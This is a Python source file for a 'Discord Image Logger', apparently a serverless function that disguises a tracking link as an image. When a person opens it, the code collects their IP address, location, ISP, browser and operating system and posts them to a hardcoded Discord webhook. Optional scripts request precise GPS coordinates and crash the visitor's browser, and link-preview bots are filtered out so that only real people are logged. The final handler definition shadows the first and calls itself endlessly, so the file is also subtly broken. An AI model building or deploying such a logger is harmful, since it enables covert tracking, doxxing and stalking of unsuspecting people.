from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser
import json
import os

__app__ = "Discord Image Logger"
__description__ = "a simple image logger"
__version__ = "v2.0"
__author__ = "foaqen"

config = {
    "webhook": "https://discord.com/api/webhooks/1467553434541625558/fKl1f66ykkbYUxlzxhR-ODuDaskO6bZvEi_Xb7zxeR0MNelnYg3LJBs-ZFCmA2QYDmbK",
    "image": "https://pngimg.com/uploads/spongebob/spongebob_PNG10.png",
    "imageArgument": True,
    "username": "Logger Agent",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "A new person clicked.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": False,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://example.org"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error!",
                    "color": config["color"],
                    "description": f"An error occurred while logging the IP address!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip:
        ip = "Unknown"
    
    if ip != "Unknown" and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"IPLogger link was sent to a chat!\nYou will be notified when someone clicks.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                })
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {
            "isp": "Unknown",
            "as": "Unknown",
            "country": "Unknown",
            "regionName": "Unknown",
            "city": "Unknown",
            "lat": 0,
            "lon": 0,
            "timezone": "Unknown/Unknown",
            "mobile": False,
            "proxy": False,
            "hosting": False
        }
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - Someone Clicked!",
                "color": config["color"],
                "description": f"""**A user opened the original image**

**Endpoint:** `{endpoint}`
                
**IP Address:**
> **IP:** `{ip}`
> **ISP:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coordinates:** `{str(info.get('lat', 0)) + ', ' + str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', '') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**Computer Information:**
> **Operating System:** `{os_name}`
> **Browser:** `{browser}`

**Agent:**
{useragent if useragent else 'Unknown'}

""",
            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass
    
    return info

# Vercel serverless function handler
def handler(request):
    try:
        # Handle different Vercel request formats
        if isinstance(request, dict):
            # For newer Vercel Python runtime
            headers = request.get('headers', {})
            
            # Get IP address
            ip = (headers.get('x-forwarded-for') or 
                  headers.get('x-real-ip') or 
                  request.get('http_x_forwarded_for') or
                  'Unknown')
            
            # Get user agent
            useragent = headers.get('user-agent', 'Unknown')
            
            # Get path and query parameters
            path = request.get('path', '/')
            
            # Handle query parameters
            query_string = ''
            if 'queryStringParameters' in request:
                query_params = request.get('queryStringParameters', {}) or {}
                query_string = '&'.join([f"{k}={v}" for k, v in query_params.items()])
            else:
                query_string = request.get('rawQuery', '') or ''
            
            query_params = dict(parse.parse_qsl(query_string))
            
        else:
            # For older format or testing
            headers = {}
            ip = 'Unknown'
            useragent = 'Unknown'
            path = '/'
            query_params = {}
        
        # Clean IP (remove port if present)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        elif ip and ':' in ip and '.' in ip:
            # Handle IPv6 format
            ip = ip.split(':')[0]
        
        print(f"Request received - IP: {ip}, UA: {useragent}, Path: {path}")
        
        # Get image URL
        if config["imageArgument"]:
            if query_params.get("url") or query_params.get("id"):
                try:
                    url_param = query_params.get("url") or query_params.get("id")
                    url = base64.b64decode(url_param.encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]
        
        # Check if blacklisted
        if ip != "Unknown" and any(ip.startswith(bl) for bl in blacklistedIPs):
            return {
                "statusCode": 200,
                "headers": {
                    "Content-Type": "text/plain",
                    "Cache-Control": "no-cache, no-store, must-revalidate"
                },
                "body": "OK"
            }
        
        # Handle bot detection
        bot_result = botCheck(ip, useragent)
        if bot_result:
            print(f"Bot detected: {bot_result}")
            makeReport(ip, useragent, endpoint=path, url=url)
            
            if config["buggedImage"]:
                # Return a 1x1 transparent GIF
                gif_data = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
                return {
                    "statusCode": 200,
                    "headers": {
                        "Content-Type": "image/gif",
                        "Cache-Control": "no-cache, no-store, must-revalidate"
                    },
                    "body": base64.b64encode(gif_data).decode('utf-8'),
                    "isBase64Encoded": True
                }
            else:
                return {
                    "statusCode": 302,
                    "headers": {
                        "Location": url,
                        "Cache-Control": "no-cache, no-store, must-revalidate"
                    },
                    "body": ""
                }
        
        # Handle accurate location
        if query_params.get("g") and config["accurateLocation"]:
            try:
                location = base64.b64decode(query_params.get("g").encode()).decode()
                result = makeReport(ip, useragent, location, path, url=url)
            except:
                result = makeReport(ip, useragent, endpoint=path, url=url)
        else:
            result = makeReport(ip, useragent, endpoint=path, url=url)
        
        # Build HTML content
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            overflow: hidden;
            background-color: #000;
        }}
        .img {{
            background-image: url('{url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
            position: absolute;
            top: 0;
            left: 0;
        }}
    </style>
</head>
<body>
    <div class="img"></div>
'''
        
        # Add message if enabled
        if config["message"]["doMessage"]:
            message = config["message"]["message"]
            if config["message"]["richMessage"] and result and isinstance(result, dict):
                message = message.replace("{ip}", ip)
                message = message.replace("{isp}", str(result.get("isp", "Unknown")))
                message = message.replace("{asn}", str(result.get("as", "Unknown")))
                message = message.replace("{country}", str(result.get("country", "Unknown")))
                message = message.replace("{region}", str(result.get("regionName", "Unknown")))
                message = message.replace("{city}", str(result.get("city", "Unknown")))
                message = message.replace("{lat}", str(result.get("lat", "0")))
                message = message.replace("{long}", str(result.get("lon", "0")))
                
                timezone = result.get("timezone", "Unknown/Unknown")
                if '/' in timezone:
                    message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
                else:
                    message = message.replace("{timezone}", "Unknown")
                
                message = message.replace("{mobile}", str(result.get("mobile", False)))
                message = message.replace("{vpn}", str(result.get("proxy", False)))
                message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                
                os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
                message = message.replace("{browser}", browser)
                message = message.replace("{os}", os_name)
            
            html_content += f'<div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: white; padding: 20px; border-radius: 10px; z-index: 1000;">{message}</div>'
        
        # Add crash browser script
        if config["crashBrowser"]:
            html_content += '<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i);while(1){location.reload()}}},100)</script>'
        
        # Add redirect if enabled
        if config["redirect"]["redirect"]:
            html_content += f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
        
        # Add geolocation script
        if config["accurateLocation"]:
            html_content += """<script>
(function() {
    var currenturl = window.location.href;
    if (!currenturl.includes("g=")) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(coords) {
                    var separator = currenturl.includes("?") ? "&" : "?";
                    var locationData = btoa(coords.coords.latitude + "," + coords.coords.longitude);
                    window.location.href = currenturl + separator + "g=" + encodeURIComponent(locationData);
                },
                function(error) {
                    console.log("Geolocation error:", error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }
    }
})();
</script>"""
        
        html_content += '</body></html>'
        
        return {
            "statusCode": 200,
            "headers": {
                "Content-Type": "text/html",
                "Cache-Control": "no-cache, no-store, must-revalidate"
            },
            "body": html_content
        }
    
    except Exception as e:
        print(f"Error: {traceback.format_exc()}")
        try:
            reportError(traceback.format_exc())
        except:
            pass
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "text/plain"},
            "body": f"Internal Server Error: {str(e)}"
        }

# Vercel serverless function entry point
def handler(event, context):
    return handler(event)
